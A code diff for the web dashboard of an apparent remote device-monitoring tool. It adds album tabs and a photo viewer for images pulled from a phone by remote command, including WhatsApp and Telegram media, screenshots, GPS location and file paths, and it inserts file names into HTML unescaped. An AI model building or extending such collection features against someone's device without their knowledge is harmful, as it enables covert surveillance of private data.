@@ -46,6 +46,39 @@ const sidebar = document.getElementById('sidebar');
 let autoRefreshInterval = null;
 const AUTO_REFRESH_MS = 30000;
 
+// Toast notification system
+function showToast(message, type = 'info', duration = 4000) {
+  // Remove existing toast
+  const existingToast = document.querySelector('.toast-notification');
+  if (existingToast) existingToast.remove();
+  
+  const toast = document.createElement('div');
+  toast.className = `toast-notification toast-${type}`;
+  
+  const icons = {
+    success: 'fa-check-circle',
+    error: 'fa-exclamation-circle',
+    warning: 'fa-exclamation-triangle',
+    info: 'fa-info-circle'
+  };
+  
+  toast.innerHTML = `
+    <i class="fas ${icons[type] || icons.info}"></i>
+    <span>${message}</span>
+  `;
+  
+  document.body.appendChild(toast);
+  
+  // Trigger animation
+  setTimeout(() => toast.classList.add('show'), 10);
+  
+  // Auto remove
+  setTimeout(() => {
+    toast.classList.remove('show');
+    setTimeout(() => toast.remove(), 300);
+  }, duration);
+}
+
 // Initialize
 document.addEventListener('DOMContentLoaded', () => {
   if (authToken) {
@@ -189,9 +222,16 @@ function setupEventListeners() {
   document.getElementById('btnDeleteAllPhotos')?.addEventListener('click', deleteAllPhotos);
   document.getElementById('closePhotoModal')?.addEventListener('click', closePhotoModal);
   document.getElementById('btnDownloadPhoto')?.addEventListener('click', downloadCurrentPhoto);
-  document.getElementById('btnApplyDateFilter')?.addEventListener('click', applyPhotoDateFilter);
+  document.getElementById('btnGoFilter')?.addEventListener('click', applyPhotoDateFilter);
   document.getElementById('btnClearDateFilter')?.addEventListener('click', clearPhotoDateFilter);
   document.getElementById('btnLoadMorePhotos')?.addEventListener('click', loadMorePhotos);
+  
+  // Album tabs
+  document.querySelectorAll('.album-tab[data-source]').forEach(tab => {
+    tab.addEventListener('click', () => {
+      selectAlbumTab(tab.dataset.source);
+    });
+  });
   
   // Stream modal
   document.getElementById('closeStream').addEventListener('click', stopStream);
@@ -1221,7 +1261,49 @@ function debounce(func, wait) {
 // ========== GALLERY ==========
 let galleryCurrentPage = 1;
 let galleryTotalPages = 1;
-let currentPhotoFilter = { startDate: null, endDate: null };
+let currentPhotoFilter = { startDate: null, endDate: null, source: 'all' };
+
+// Show/hide gallery loading bar
+function showGalleryLoading(show = true) {
+  const loading = document.getElementById('galleryLoading');
+  if (loading) {
+    if (show) {
+      loading.classList.remove('hidden');
+    } else {
+      loading.classList.add('hidden');
+    }
+  }
+}
+
+// Update album tab counts
+function updateAlbumCounts(albums) {
+  if (!albums) return;
+  
+  document.getElementById('albumCountAll').textContent = albums.all || 0;
+  document.getElementById('albumCountCamera').textContent = albums.Camera || 0;
+  document.getElementById('albumCountScreenshot').textContent = albums.Screenshot || 0;
+  document.getElementById('albumCountWhatsApp').textContent = albums.WhatsApp || 0;
+  document.getElementById('albumCountTelegram').textContent = albums.Telegram || 0;
+  document.getElementById('albumCountDownload').textContent = albums.Download || 0;
+  document.getElementById('albumCountOther').textContent = albums.Other || 0;
+}
+
+// Handle album tab click
+function selectAlbumTab(source) {
+  // Update tab UI
+  document.querySelectorAll('.album-tab').forEach(tab => {
+    if (tab.dataset.source === source) {
+      tab.classList.add('active');
+    } else {
+      tab.classList.remove('active');
+    }
+  });
+  
+  // Update filter and reload
+  currentPhotoFilter.source = source;
+  galleryCurrentPage = 1;
+  loadGallery(1, false);
+}
 
 async function loadGallery(page = 1, append = false) {
   if (!selectedDevice) {
@@ -1229,6 +1311,11 @@ async function loadGallery(page = 1, append = false) {
     // Hide warning when no device selected
     document.getElementById('storageWarning')?.classList.add('hidden');
     return;
+  }
+  
+  // Show loading bar
+  if (!append) {
+    showGalleryLoading(true);
   }
   
   try {
@@ -1245,23 +1332,39 @@ async function loadGallery(page = 1, append = false) {
       queryParams += '&hours=168'; // Default 7 days
     }
     
+    // Add source/album filter
+    if (currentPhotoFilter.source && currentPhotoFilter.source !== 'all') {
+      queryParams += `&source=${currentPhotoFilter.source}`;
+    }
+    
     const data = await api(`/devices/${getDeviceId(selectedDevice)}/photos?${queryParams}`);
+    
+    // Hide loading bar
+    showGalleryLoading(false);
     
     // Update storage info
     updateStorageDisplay(data);
+    
+    // Update album counts
+    updateAlbumCounts(data.albums);
     
     // Update photo count
     document.getElementById('photoCount').textContent = `${data.total || 0} photos`;
     
     // Update gallery info text
+    let infoText = 'Showing';
+    if (currentPhotoFilter.source && currentPhotoFilter.source !== 'all') {
+      infoText += ` ${currentPhotoFilter.source} photos`;
+    } else {
+      infoText += ' all photos';
+    }
     if (currentPhotoFilter.startDate || currentPhotoFilter.endDate) {
-      let infoText = 'Showing photos';
       if (currentPhotoFilter.startDate) infoText += ` from ${currentPhotoFilter.startDate}`;
       if (currentPhotoFilter.endDate) infoText += ` to ${currentPhotoFilter.endDate}`;
-      document.getElementById('galleryInfoText').textContent = infoText;
     } else {
-      document.getElementById('galleryInfoText').textContent = 'Showing photos from the last 7 days';
+      infoText += ' from the last 7 days';
     }
+    document.getElementById('galleryInfoText').textContent = infoText;
     
     // Update pagination
     galleryCurrentPage = data.page || 1;
@@ -1277,19 +1380,35 @@ async function loadGallery(page = 1, append = false) {
       return;
     }
     
-    const photosHtml = data.photos.map(photo => `
-      <div class="gallery-item">
-        <img src="data:${photo.mimeType || 'image/jpeg'};base64,${photo.thumbnail}" alt="${photo.fileName}" onclick="viewPhoto('${photo.id}')">
-        <div class="gallery-item-overlay">
-          <button class="btn-icon" onclick="event.stopPropagation(); downloadPhoto('${photo.id}', '${photo.fileName || 'photo.jpg'}')" title="Download">
-            <i class="fas fa-download"></i>
-          </button>
+    const photosHtml = data.photos.map(photo => {
+      const sourceIcon = {
+        'Camera': 'fa-camera',
+        'Screenshot': 'fa-mobile-alt',
+        'WhatsApp': 'fab fa-whatsapp',
+        'Telegram': 'fab fa-telegram',
+        'Download': 'fa-download',
+        'Other': 'fa-folder'
+      };
+      const iconClass = sourceIcon[photo.source] || 'fa-folder';
+      const isFab = iconClass.startsWith('fab');
+      
+      return `
+        <div class="gallery-item" onclick="viewPhoto('${photo.id}')">
+          <img src="data:${photo.mimeType || 'image/jpeg'};base64,${photo.thumbnail}" alt="${photo.fileName}">
+          <div class="gallery-item-source">
+            <i class="${isFab ? iconClass : 'fas ' + iconClass}"></i>
+          </div>
+          <div class="gallery-item-overlay">
+            <button class="btn-icon" onclick="event.stopPropagation(); downloadPhoto('${photo.id}', '${photo.fileName || 'photo.jpg'}')" title="Download">
+              <i class="fas fa-download"></i>
+            </button>
+          </div>
+          <div class="gallery-item-info">
+            <span class="photo-time">${formatTime(photo.dateTaken || photo.timestamp)}</span>
+          </div>
         </div>
-        <div class="gallery-item-info">
-          <span class="photo-time">${formatTime(photo.dateTaken || photo.timestamp)}</span>
-        </div>
-      </div>
-    `).join('');
+      `;
+    }).join('');
     
     if (append) {
       container.insertAdjacentHTML('beforeend', photosHtml);
@@ -1305,6 +1424,7 @@ async function loadGallery(page = 1, append = false) {
     }
   } catch (error) {
     console.error('Failed to load gallery:', error);
+    showGalleryLoading(false);
     document.getElementById('galleryGrid').innerHTML = '<p class="empty-state">Failed to load photos</p>';
     // Hide warning on error and reset storage display to 0
     document.getElementById('storageWarning')?.classList.add('hidden');
@@ -1345,7 +1465,12 @@ function applyPhotoDateFilter() {
   const startDate = document.getElementById('photoStartDate').value;
   const endDate = document.getElementById('photoEndDate').value;
   
-  currentPhotoFilter = { startDate, endDate };
+  // Preserve source filter when applying date filter
+  currentPhotoFilter = { 
+    startDate, 
+    endDate, 
+    source: currentPhotoFilter.source || 'all' 
+  };
   galleryCurrentPage = 1;
   loadGallery(1, false);
 }
@@ -1353,8 +1478,18 @@ function applyPhotoDateFilter() {
 function clearPhotoDateFilter() {
   document.getElementById('photoStartDate').value = '';
   document.getElementById('photoEndDate').value = '';
-  currentPhotoFilter = { startDate: null, endDate: null };
+  currentPhotoFilter = { startDate: null, endDate: null, source: 'all' };
   galleryCurrentPage = 1;
+  
+  // Reset album tabs to "All"
+  document.querySelectorAll('.album-tab').forEach(tab => {
+    if (tab.dataset.source === 'all') {
+      tab.classList.add('active');
+    } else {
+      tab.classList.remove('active');
+    }
+  });
+  
   loadGallery(1, false);
 }
 
@@ -1395,7 +1530,7 @@ async function syncPhotos() {
         await deleteAllPhotos();
         // After deletion, try to sync
         await sendCommand('sync_photos', { hours: 168 }, true);
-        alert('Photo sync request sent to device. Photos will sync from newest to oldest until storage is full.');
+        showToast('Photo sync request sent! Photos will sync from newest to oldest.', 'success', 5000);
         setTimeout(() => loadGallery(), 5000);
       }
       return;
@@ -1403,12 +1538,12 @@ async function syncPhotos() {
     
     // Send sync_photos command via FCM to the device
     await sendCommand('sync_photos', { hours: 168 }, true);
-    alert('Photo sync request sent to device. Photos will sync from newest to oldest until storage is full.\n\nPlease wait a moment and refresh.');
+    showToast('Photo sync request sent! Please wait a moment for photos to load.', 'success', 5000);
     
     // Reload gallery after a delay for device to upload photos
     setTimeout(() => loadGallery(), 5000);
   } catch (error) {
-    alert('Failed to sync photos: ' + error.message);
+    showToast('Failed to sync photos: ' + error.message, 'error');
   }
 }
 
@@ -1430,13 +1565,13 @@ async function deleteAllPhotos() {
     
     if (response.success) {
       const freedMB = response.freedStorage ? (response.freedStorage / 1024 / 1024).toFixed(1) : 0;
-      alert(`Deleted ${response.deletedCount || 'all'} photos from server.\nFreed ${freedMB} MB of storage.`);
+      showToast(`Deleted ${response.deletedCount || 'all'} photos. Freed ${freedMB} MB.`, 'success');
       loadGallery();
     } else {
-      alert('Failed to delete photos: ' + (response.error || 'Unknown error'));
+      showToast('Failed to delete photos: ' + (response.error || 'Unknown error'), 'error');
     }
   } catch (error) {
-    alert('Failed to delete photos: ' + error.message);
+    showToast('Failed to delete photos: ' + error.message, 'error');
   }
 }
 
@@ -1509,14 +1644,47 @@ async function viewPhoto(photoId) {
     // Store for download button
     currentViewedPhoto = photo;
     
+    // Update modal content
     document.getElementById('photoFileName').textContent = photo.fileName || 'Photo';
     document.getElementById('fullPhotoImage').src = `data:${photo.mimeType || 'image/jpeg'};base64,${photo.image}`;
-    document.getElementById('photoDate').textContent = `Date: ${new Date(photo.dateTaken || photo.timestamp).toLocaleString()}`;
-    document.getElementById('photoSize').textContent = `Size: ${formatFileSize(photo.size)}`;
+    
+    // Date taken
+    const dateTaken = new Date(photo.dateTaken || photo.timestamp);
+    document.getElementById('photoDate').textContent = dateTaken.toLocaleString();
+    
+    // Source/Album
+    document.getElementById('photoSource').textContent = photo.source || 'Other';
+    
+    // Dimensions
+    if (photo.width && photo.height) {
+      document.getElementById('photoDimensions').textContent = `${photo.width} x ${photo.height}`;
+    } else {
+      document.getElementById('photoDimensions').textContent = 'Unknown';
+    }
+    
+    // File size
+    document.getElementById('photoSize').textContent = formatFileSize(photo.size);
+    
+    // Location
+    const locationContainer = document.getElementById('photoLocationContainer');
+    const locationText = document.getElementById('photoLocation');
+    if (photo.location && (photo.location.latitude || photo.location.address)) {
+      locationContainer.classList.remove('hidden');
+      if (photo.location.address) {
+        locationText.textContent = photo.location.address;
+      } else if (photo.location.latitude && photo.location.longitude) {
+        locationText.textContent = `${photo.location.latitude.toFixed(6)}, ${photo.location.longitude.toFixed(6)}`;
+      }
+    } else {
+      locationText.textContent = 'No location data';
+    }
+    
+    // File path
+    document.getElementById('photoFilePath').textContent = photo.filePath || 'Unknown';
     
     document.getElementById('photoModal').classList.remove('hidden');
   } catch (error) {
-    alert('Failed to load photo: ' + error.message);
+    console.error('Failed to load photo:', error);
   }
 }
 
